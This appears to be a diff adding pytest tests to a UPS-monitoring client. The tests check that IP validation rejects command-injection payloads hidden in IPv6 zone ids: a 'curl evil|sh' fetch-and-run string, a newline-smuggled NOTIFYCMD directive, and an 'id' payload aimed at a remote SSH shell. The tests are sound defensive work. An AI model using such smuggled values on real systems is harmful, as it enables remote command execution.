@@ -1234,3 +1234,38 @@ def test_upsd_listen_emits_loopback_once_when_lan_ip_is_loopback():
     text, changed = nutclient.upsert_upsd_listen("", "127.0.0.1")
     assert changed is True
     assert _active(text) == ["LISTEN 127.0.0.1 3493"]
+
+
+# --- IPv6 zone ids: `ipaddress` accepts any text after `%` --------------------
+
+
+@pytest.mark.parametrize(
+    "value",
+    [
+        "fe80::1%x;curl${IFS}evil|sh;",  # shell metacharacters in the zone id
+        "fe80::1%x\nNOTIFYCMD sh -c $HOME",  # a second NUT directive
+        "fe80::1%eth0 ups.status",  # a space splits the remote argv
+        "192.168.1.125\n",  # a control char survives .strip() at the sink
+    ],
+)
+def test_valid_ip_refuses_an_injectable_value(value):
+    assert not nutclient.valid_ip(value)
+    assert not nutclient.valid_ipv4(value)
+
+
+def test_valid_ip_still_accepts_an_interface_shaped_zone_id():
+    assert nutclient.valid_ip("fe80::1%eth0")
+    assert nutclient.valid_ip("fe80::1%enp3s0.100")
+    assert nutclient.valid_ip(" 192.168.1.125 ")  # callers strip surrounding spaces
+
+
+def test_verify_secondary_never_ships_a_zone_id_payload_to_the_remote_shell():
+    ssh = FakeSSH([(0, "OL\n", "")])
+    ok, reason = nutclient.verify_secondary("mt", "cyberpower", "fe80::1%x;id;", ssh)
+    assert not ok and "invalid primary IP" in reason
+    assert ssh.calls == []
+
+
+def test_upsert_upsd_listen_refuses_a_directive_carrying_address():
+    with pytest.raises(ValueError, match="bare IP"):
+        nutclient.upsert_upsd_listen("", "fe80::1%x\nLISTEN 0.0.0.0")
